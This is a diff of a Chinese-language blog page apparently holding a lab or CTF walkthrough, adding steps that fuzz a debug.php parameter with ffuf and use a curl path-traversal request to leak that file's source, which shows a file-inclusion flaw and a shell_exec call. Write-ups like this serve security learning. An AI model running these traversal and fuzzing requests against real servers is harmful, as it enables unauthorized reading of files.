@@ -419,14 +419,14 @@ Starting Nm">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        896
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        5 分
                     </div>
                     
                 
@@ -544,10 +544,44 @@ Progress: 2864395 / 2867293 (99.90%)
 <blockquote>
 <p>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u ‘<a target="_blank" rel="noopener" href="http://192.168.113.131/debug.php?FUZZ=/var/www/html&#39;">http://192.168.113.131/debug.php?FUZZ=/var/www/html&#39;</a> -fs 0,194</p>
 </blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/ki/4.png" alt="枚举变量"></p>
 <p><img src="http://alexjakin.github.io/medias/reward/ki/2.png" alt="phpinfo"></p>
 <p>仔细寻找后，在这个phpinfo并没有找到有用信息，于是就开始想办法获得debug.php的源码，通过phpinfo页面可以发现debug程序的绝对路径，但是我们在只能通过url慢慢构造相对路径</p>
 <p><img src="http://alexjakin.github.io/medias/reward/ki/3.png" alt="debug文件的绝对路径"></p>
+<p>直到尝试七次返回上级的时候开始出现debug.php源码</p>
+<pre><code>
+└─$ curl -i http://192.168.113.131/debug.php?file=../../../../../../../var/www/html/debug
+HTTP/1.1 200 OK
+Date: Wed, 31 May 2023 03:32:18 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 502
+Content-Type: text/html; charset=UTF-8
 
+&lt;!-- T-56819 - added file parameter for easier page navigation with linuxki - chris --&gt;
+
+&lt;!-- T-56819 - added file parameter for easier page navigation with linuxki - chris --&gt;
+
+&lt;?php
+
+if (isset($_GET[&#39;environ&#39;]))&#123;
+    echo phpinfo();
+&#125;
+
+if (isset($_GET[&#39;file&#39;]))&#123;
+    echo file_get_contents(&quot;linuxki/experimental/vis/&quot; . $_GET[&#39;file&#39;] . &quot;.php&quot;);
+&#125;
+
+
+echo shell_exec(&quot;/opt/linuxki/runki -f&quot;);
+
+?&gt;
+=== runki for Linux version 6.0
+!!! runki script must be run as root
+!!! currently logged in with UID 33
+
+
+</code></pre>
             </div>
             <hr/>
 
@@ -998,7 +1032,7 @@ nmap -p- -sV -A 192.168.113.132
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">71.5k</span>
+                <span class="white-color">71.6k</span>
             
 
             
